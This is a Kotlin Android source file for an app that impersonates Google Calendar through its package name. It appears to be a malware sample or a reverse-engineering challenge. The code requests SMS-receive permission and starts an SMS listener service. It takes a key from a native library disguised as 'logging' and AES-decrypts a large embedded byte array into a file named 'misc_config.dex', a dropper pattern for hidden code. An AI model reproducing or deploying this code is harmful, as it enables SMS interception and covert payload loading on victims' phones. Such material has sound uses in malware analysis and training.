package com.google.calendar.android

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.padding
import androidx.compose.material.MaterialTheme
import androidx.compose.material.Scaffold
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.File

class MainActivity : ComponentActivity() {
    private val REQUEST_SMS_PERMISSION = 101

    override fun onStart() {
        super.onStart()
        if (ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.RECEIVE_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(android.Manifest.permission.RECEIVE_SMS),
                REQUEST_SMS_PERMISSION
            )
        }
        if (ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.RECEIVE_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(android.Manifest.permission.RECEIVE_SMS),
                REQUEST_SMS_PERMISSION
            )
        } else {
            startSmsListenerService()
        }
    }
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_SMS_PERMISSION) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "SMS permission granted", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "SMS permission denied", Toast.LENGTH_SHORT).show()
            }
        }
    }
    private fun startSmsListenerService() {
        val serviceIntent = Intent(this, SmsListenerService::class.java)
        startService(serviceIntent)
    }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val sharedPrefs = getSharedPreferences("com.google.calendar.android", Context.MODE_PRIVATE)

        setContent {
            var voucherStr by rememberSaveable {mutableStateOf<String?>(sharedPrefs.getString("voucher", null))}
            MaterialTheme {
                Scaffold {
                    Box(modifier = Modifier.padding(it)) {
                        VoucherRedeemScreen(
                            onCodeSubmit = { code ->

                                try {
                                    val str = unlockVoucherCode(this@MainActivity, code)
                                    if (!str.endsWith("09b4")){
                                        Toast.makeText(this@MainActivity, "Invalid code", Toast.LENGTH_SHORT).show()
                                        return@VoucherRedeemScreen true
                                    }
                                    val byteArray = byteArrayOf(116, 120, -100, 118, -75, -46, 30, 43, 47, 107, -7, -116, 38, -13, -44, 117, 116, 43, -64, 122, -57, -25, 39, 72, 63, 9, -80, 30, 41, 61, 39, -37, 114, 57, -102, 117, 12, 12, -83, -98, -90, 64, 29, 60, -46, 54, 17, -56, 83, 41, -111, 3, 25, 31, 22, 16, 127, -127, 91, -24, -80, -116, 1, 75, -35, 4, 73, 47, -109, -126, -47, 39, -94, -120, -108, -72, 51, 80, 51, 0, 46, -106, 64, 71, -30, 1, 23, 103, 29, -2, 19, -10, 55, 93, -80, 33, -21, -126, -105, -91, -31, -67, -128, -118, 72, -55, -26, -5, -4, 65, 24, -68, 45, -59, -119, -92, -82, -76, 51, 39, 5, 71, -19, -29, -122, 68, 64, 24, -53, -95, 95, -119, 72, 117, 1, -26, -62, 8, 110, 78, -25, -91, 32, 15, -71, 0, 123, 83, 43, 75, 54, 106, -83, -82, 27, -102, 103, -68, -90, 46, -108, 58, -93, -44, -109, 13, -32, -52, -14, -99, -2, -20, 127, -49, -60, -33, -85, -112, -8, -113, 60, -33, -5, -79, 56, -80, -30, -91, -98, 55, -78, -53, -90, -56, -81, 68, -36, -92, -33, 125, 80, 48, 86, -74, 81, -40, 37, -7, 75, 84, -114, 2, 56, -7, 13, -35, 52, -53, 6, 43, 83, -56, 3, -8, 23, -69, 97, -5, 108, -68, 42, -85, -4, -103, 104, 24, 107, -61, -111, -4, 97, -52, -1, 126, -36, -84, 94, -29, -101, 50, -73, -21, -119, -99, -45, 19, -12, 6, 106, 24, 111, 82, 96, -58, 88, -125, -119, -106, -28, -89, 73, -86, 105, 10, 98, 32, 123, -103, -127, -59, -19, 34, -13, -29, -107, 74, -74, -98, 50, 105, 86, -105, -84, 38, 105, 100, -77, 123, -24, -112, -82, -119, -89, 68, 31, 68, -67, 77, -24, 81, 103, 86, -47, -5, -19, -111, 78, 46, -112, 72, -97, 96, -73, -58, -1, -104, -82, -80, 20, -120, 89, 102, 11, -11, 9, -68, -25, -69, -101, -79, 13, 7, -119, 95, -67, 45, 30, -78, -74, 36, 78, 65, -107, 76, -98, -62, 35, -26, 62, 107, 44, -124, 80, -5, 71, -27, -26, -106, 37, -45, 48, -119, -46, -71, 34, -79, 73, -53, -85, -58, -14, -57, 29, 113, 125, 38, -39, 103, 50, -126, 7, -40, -115, -71, 31, -48, 118, -36, -42, 74, 118, 6, -57, -31, -44, -33, -73, -34, 94, -73, 56, -111, -82, -113, -75, 10, 96, 47, 127, -53, -119, -84, -113, -88, -54, 93, 106, 46, 88, -126, -86, -46, -21, -77, 93, 3, -123, 29, 85, 59, -50, -92, -22, 19, 18, 56, -115, 18, 71, 112, -122, 49, -95, -72, 65, 48, 63, 123, -92, -93, 9, 57, 106, -23, -79, -124, 78, 74, 74, -93, 61, 17, -21, 74, 28, -8, 95, -124, -95, 79, 37, -98, 19, 76, 40, 93, 99, 124, -119, 94, -44, -122, 124, -113, -117, 78, 44, 108, -43, 126, -112, -44, -88, 93, -37, 122, -39, 122, 95, -117, -113, -127, -13, 97, -83, -103, -81, 72, 31, -29, -70, -109, 62, -16, -40, -62, 120, -59, -18, 6, -71, -74, -7, 38, -67, -31, 110, 40, -99, 49, 8, -121, -1, 24, -110, -59, 57, 21, 110, 105, -29, -123, 57, -124, 101, 63, -12, -79, -12, -17, 26, 120, -31, 114, 28, 32, 1, -123, 93, -52, 66, 91, -79, 67, 27, 62, -55, -33, 41, -47, -94, -115, 35, 6, 59, -31, -94, 94, 100, -66, -114, -54, 24, 34, -58, 72, -27, 53, -121, 120, -36, 124, 38, 126, -120, -54, -41, 106, 52, -80, 47, 58, 40, 96, -118, -57, -90, 101, -96, 103, 76, -32, 42, 71, -77, -14, 85, -48, -85, 22, -108, 25, 4, -98, -123, 68, -58, 36, -16, 33, -17, -75, -27, -78, 91, 7, -41, -124, -42, -100, -104, 92, 101, -55, 9, -41, -32, -10, -35, 72, 101, -93, -57, -70, 24, 42, -126, -91, 93, 44, -127, 50, -106, 7, 68, 95, 107, -44, 63, -23, -122, 82, 59, -6, 108, -17, -71, 6, -126, 21, -11, 118, -110, 61, 93, -54, 111, -40, -60, 87, 81, -47, -116, -77, 36, 88, -112, 35, -122, -87, 92, 48, -39, -12, -78, -29, 103, 111, -108, -98, 113, -75, 112, -84, 123, 106, 68, -91, 124, -34, -86, 8, -70, -49, -16, -94, 106, 64, 123, -17, 23, -118, 112, 68, -119, -75, -60, -74, 98, -68, -46, 6, -120, -27, 28, 122, 41, -80, -2, 56, -30, -106, 57, -88, 113, 117, 45, -77, 24, -54, 92, -29, 75, -85, 86, -84, 89, -121, -92, 125, 68, -74, -126, -32, 30, -40, -63, -97, -22, 18, -114, -29, 112, -39, -114, 101, -123, 108, -91, 120, 35, 90, -36, 20, 31, 34, -70, -32, -101, -48, 72, -77, -19, 18, 72, 18, -128, -3, -117, -127, -15, -25, -79, -91, 24, -111, -29, -82, 40, 60, -117, -64, -16, 60, -100, -101, -53, -124, 1, 124, 78, 21, 122, -55, -55, -101, -52, 66, -35, -20, -39, 45, 7, 125, -68, -105, 48, -98, -101, -15, 82, 32, -99, -14, 4, -4, -26, 9, 55, 3, 96, 34, -81, -116, 18, 6, -42, 73, 18, 101, 114, -11, 3, 25, 44, 26, -110, -121, 91, -40, -42, 65, -121, 59, -89, -50, 111, 46, 84, -92, 0, 46, 87, 75, -54, 36, 52, -115, 45, 39, 53, -56, -8, 79, 52, 99, 78, -39, -35, 67, -54, 42, -10, -101, -102, 29, 67, 39, 31, -128, -29, -107, 99, 83, -92, -111, -19, -10, 3, 60, -106, -33, 93, 16, -84, -33, -72, 74, -116, 98, 37, 96, -80, 94, 54, 59, -13, 96, -85, -113, 120, 57, 97, -110, -38, -9, 3, -38, -71, 61, -73, 29, -122, -61, -120, 68, 11, -25, -45, -16, -88, -62, 93, 112, 19, -22, -85, -60, -37, 75, 16, -70, 28, 96, 79, 99, -107, -56, -83, 122, -122, 16, -81, -121, 52, -126, 1, -30, 125, -70, -86, -6, 123, -87, -3, 84, 127, 50, 97, 26, 106, -81, -53, -47, -18, 6, 122, 70, 67, -121, 106, 65, -64, 82, -86, 35, 8, 103, -118, -116, 126, -33, 28, 118, -54, -44, 39, 70, 36, -42, 112, 37, -41, -21, -61, 21, -41, 27, 31, 40, 32, 12, -111, 33, -128, 36, -66, -6, 66, -50, -114, -85, 6, 46, 65, 125, -18, -62, 80, -74, 34, -44, 20, 35, 8, 69, -30, -96, 75, 86, -22, -62, -62, -53, 112, -11, -49, -26, 98, 29, -24, -31, -100, -44, -75, -79, 62, -3, 83, -120, 50, -108, 8, -47, 75, 27, -68, 36, 92, 115, -127, 123, -109, 65, 52, 101, 29, 70, 37, -12, -23, 106, -7, -67, -61, -14, -60, 25, 49, -87, 62, -59, 15, -53, 72, 35, 59, -26, 51, 23, -4, -60, -46, -10, 84, -2, -126, 120, -80, 65, -110, 109, -54, -33, 2, 75, 122, -80, 100, -84, -117, -4, -82, -64, -10, -20, -115, 72, 10, -24, -41, -11, -93, 59, 83, 95, 75, -116, -29, 65, 23, -32, 64, 112, 95, -25, 112, 41, 116, 104, 35, -35, -60, 27, 38, -62, -44, -110, 19, 115, -107, 112, -48, -15, 55, 50, -68, 82, 71, -37, 51, 6, 40, -80, -96, 37, 23, -82, -2, -103, -106, -31, 43, 91, -49, -57, -24, 99, -7, 35, -28, -83, -125, -50, 24, 81, 36, -122, 46, 57, 107, 101, 47, -78, 59, 19, 83, 70, -87, -111, 38, -11, -26, 95, 120, 54, -24, 115, 23, 113, 99, 22, -17, 118, -33, 29, -13, -42, -128, -119, 69, -34, 120, -80, 44, -32, -107, -53, -24, -67, -61, 110, 106, -69, -120, -86, 50, 97, 97, 29, -41, 66, -112, -25, -124, -55, -95, -46, 92, -43, 124, -123, 72, 77, -101, 68, -26, -45, 31, 82, 100, -4, -26, -29, -100, -39, -107, 82, 52, 13, -91, -87, 113, 78, 27, -31, -32, 123, 63, 19, 104, -3, -25, 106, 56, 21, 48, 45, -69, 24, -19, -119, -108, -104, -92, 60, -82, 2, -98, -34, 125, -28, -33, 24, -125, 14, -57, -103, 61, 102, 48, -55, 92, -26, 102, 64, -27, -108, -101, -57, -91, -8, 106, 104, -50, 105, -56, -56, 38, 13, 77, -89, -97, 50, 81, 86, -24, -59, -73, -48, -81, -109, 12, 116, -104, -46, -93, -93, -61, -41, -76, -28, 67, -38, 66, -77, 27, -84, 55, 99, 21, -16, 65, -59, 93, -58, 72, 45, 116, -35, 63, -7, 90, -60, 102, -97, -96, -43, -22, 117, -65, -11, 36, -92, 16, 50, -26, -1, 33, 0, 41, 19, 111, -52, -38, 59, 5, -126, 75, -20, 9, -20, 108, 120, -95, -84, 12, -14, 91, 60, -81, -83, -21, -32, -47, -58, -29, -91, -5, -19, 105, -1, 89, -52, 67, 1, -14, 81, -39, -5, 51, 83, 94, -79, -47, -44, 122, 96, -105, -119, 17, 78, -48, -71, 22, -120, 47, 108, 100, 86, 36, 20, -100, -98, 32, 119, 44, 72, -26, -123, 82, -72, -118, 31, -119, -7, -121, 75, -19, 109, -88, -49, 100, -86, 10, 107, -120, 70, -43, -50, -31, 78, 10, -70, 126, -58, -128, -28, 83, 81, -106, -74, 91, -47, 43, -49, 0, -52, 78, 25, 60, -120, 55, -112, 108, -93, -25, -17, -119, 6, 56, 122, -110, 82, 98, 80, -9, 80, -4, 49, 103, 87, 96, 50, -63, 36, 85, -106, 110, 37, 40, 7, -48, -106, 23, -115, -88, -26, 105, 17, 53, -72, -91, -5, 57, 52, 70, 72, 104, -82, 122, 53, 97, 1, -101, 1, -93, -35, 113, 124, 67, -90, 70, 28, 109, 125, 48, -79, 37, -106, 47, 104, 123, 64, -15, -27, -47, 102, -87, 57, 10, -27, 90, -124, 109, -122, -35, -33, -49, -87, 103, -117, -41, 66, 44, 15, -89, 64, 15, -5, -12, -56, -27, 103, -71, 118, 95, -41, 34, -34, 83, -106, -121, -82, 62, 56, -45, 119, -18, 71, 3, -2, -49, 70, 12, 82, 11, 70, 33, -70, -79, -7, -53, 27, -72, -56, -24, 73, 20, -85, -109, 74, 18, -4, -104, 53, 0, -58, 107, 123, 93, 107, -94, 9, 123, 86, -66, 46, -92, -54, -27, -1, -42, -55, -50, -102, -80, 86, -22, 4, -98, -82, 62, 104, 56, -74, -127, -72, 99, 82, 13, 23, -51, -37, -64, -113, 18, -52, 115, -37, -93, 105, 91, 102, 71, -73, -118, 86, 107, -104, 55, -50, 20, -57, -20, -1, 118, -84, 120, -88, -32, -1, -110, -5, -110, 64, -127, -16, -52, 85, 46, -111, 83, -53, -23, 116, 59, -76, -44, -6, 27, 101, 51, 89, -64, 123, -61, -50, -62, 119, -115, 58, 27, -62, 41, 74, -8, -27, 94, 87, -124, -13, -37, 104, 106, 48, 82, 49, 3, 78, -110, -45, -67, 101, -100, 127, -56, 104, -122, -74, -71, 6, -63, -14, 52, 127, 16, 61, -89, 9, -46, 119, -32, -97, 116, 47, 27, -89, -120, -14, -98, 62, -105, -126, 88, 121, 117, 15, -126, -28, 81, 113, -9, 77, 54, -88, 115, -84, 67, 24, -39, 4, -36, 99, -54, 119, 104, -57, -4, -45, 123, -105, -3, -64, 61, 19, -51, 55, -62, 17, 116, -42, -91, 102, -26, 68, 55, 99, -124, 72, 0, -84, -15, 43, 47, 75, -100, -58, 80, -84, -55, -51, -2, 82, -9, -24, 104, -87, -9, -37, -114, -19, 103, 63, -92, -89, 80, 84, 46, 61, 37, 11, 20, 67, -101, 14, 58, 6, -108, 12, -95, -49, 100, 64, -45, -30, -72, -24, -58, 59, -13, -111, 102, -73, -61, 101, 18, -113, 64, 35, -49, -22, 20, 18, 9, -27, 92, -51, 108, 21, 60, 26, -75, -62, -76, -20, -1, -74, -115, 28, -105, 75, -51, -127, -110, -97, 66, -87, 87, 71, 77, -83, -107, 29, -121, 1, 46, -60, -3, -30, -49, -121, 110, 112, 13, -74, 65, 29, 12, -22, -10, -52, 91, 103, -50, 121, -122, -16, -57, 98, 7, 123, -36, -12, 26, 38, 37, -122, -43, 103, -4, 6, 61, 62, 106, 21, 93, -75, 36, 52, -109, -1, -28, 96, -23, 73, -84, 41, 104, -32, 82, -88, -92, -69, -114, 123, -96, -62, 33, -8, -89, 25, -15, 26, -97, 27, -70, 11, -46, -17, 23, -27, -50, -19, -68, 49, -63, -86, 60, 109, 31, -46, 32, 47, -35, -14, -88, 51, -122, 86, 16, -125, 122, 20, 107, -17, 60, -54, 126, -81, -118, 68, 6, -120, 66, 74, 19, 78, 9, -16, 74, -22, -101, -85, 69, -109, 68, -67, 48, 30, -86, 73, -9, 43, 99, -64, -94, 19, -30, 91, -94, 63, -21, -116, -88, 60, 1, -95, -47, 112, -79, -33, 54, 92, 7, 71, 115, -100, -127, -54, -90, 85, -64, 85, -122, -102, -41, 120, -72, 4, -126, -41, -103, 57, -127, 23, -99, 81, 8, 122, 75, 86, 25, -7, -28, 24, 84, 124, -24, -90, -49, 24, -115, -92, 44, 59, -101, -63, -82, 87, -69, -98, -50, -61, 25, -74, 82, 53, 44, -104, -37, -18, 83, -83, -69, 101, -97, 64, -36, 114, -119, -105, 85, 82, 6, -91, -45, -25, 126, 16, 127, -31, 69, -63, 5, 66, -12, 101, 36, 125, 59, -47, -104, -55, 118, -99, -26, -32, -62, 61, 39, -5, -28, -43, -96, -87, -105, -50, -28, 60, 120, 96, -43, 16, 8, -113, -115, -77, 24, 29, -118, -28, 20, -49, -48, 84, -126, 104, 112, -97, -57, 19, -30, -111, -66, -20, 113, -1, 82, -9, 20, -113, 46, 74, 127, -102, 99, -89, -62, 7, -8, -66, -3, -38, 70, 47, -86, -64, -63, -14, -105, -109, -65, -88, -116, -83, 59, -37, 104, 33, 122, 1, -12, -77, 117, -93, 90, 114, 81, -42, 19, 45, -79, -17, -118, -9, 48, -52, 30, 98, -55, 34, 0, -77, 65, -15, 33, -94, 89, 110, 68, -126, 71, -26, -122, 27, 80, -85, 118, 68, 15, -101, 30, -85, 9, 10, 21, 91, 55, 79, 82, 4, -51, -80, -65, 37, -108, 89, 0, 46, 49, -97, -9, 96, 12, 68, 4, -118, 123, -52, 52, 98, -42, -3, -92, -89, -38, -3, 118, 15, 123, -9, -91, -12, -71, -65, -22, 115, -1, -51, 14, -52, 101, -7, -6, -2, 98, 81, 87, 10, 38, 51, 123, 27, 90, -60, -113, 103, 103, 23, -123, 112, -75, 5, 7, -43, 98, -89, -72, 52, -36, 31, -32, 40, -79, -107, 91, 32, -31, -58, -68, 96, -41, -26, -111, 108, 108, 0, 43, 55, 11, 95, 100, 69, 78, -105, -66, -62, 54, 70, -89, -15, -114, 48, 108, -37, 81, 23, 37, 84, -44, 41, 117, -69, 114, -30, -92, -22, 38, 23, 122, 119, -98, -115, 32, -65, -91, -112, -119, 32, 87, -26, 25, 113, 61, -7, -83, 83, -51, 97, -50, 37, 33, 50, -89, 122, -36, 68, 110, -84, -67, -56, -67, -42, 29, 124, 65, -112, 78, 50, 88, -102, -99, 98, -56, -29, -49, 60, 62, -124, -125, -86, -128, -7, 38, -124, 22, -61, -31, 89, 102, 97, -18, -86, 60, -69, -11, -125, 37, -10, -65, -101, -45, 61, -59, -23, 56, -27, 60, -35)
                                    val dec = aesDecrypt(byteArray, str)
                                    val dexPath = filesDir.absolutePath + "/misc_config.dex"
                                    File(dexPath).writeBytes(dec)
                                    voucherStr = code
                                    val editor = sharedPrefs.edit()
                                    editor.putString("voucher", code)
                                    editor.apply()
                                    return@VoucherRedeemScreen false
                                }catch (e: Exception){
                                    Toast.makeText(this@MainActivity, "Invalid code", Toast.LENGTH_SHORT).show()
                                    Log.e("VoucherRedeemScreen", "lol, try harder", e)
                                }
                                return@VoucherRedeemScreen true
                            },
                            voucherCode = voucherStr
                        )
                    }

                }
            }
        }
    }
    /**
     * A native method that is implemented by the 'android' native library,
     * which is packaged with this application.
     */
    external fun stringFromJNI(): String

    external fun unlockVoucherCode(ctx: Context, code: String): String

    companion object {
        // Used to load the ~~'android'~~ 'logging' library on application startup.
        init {
            System.loadLibrary("logging")
        }
    }
}
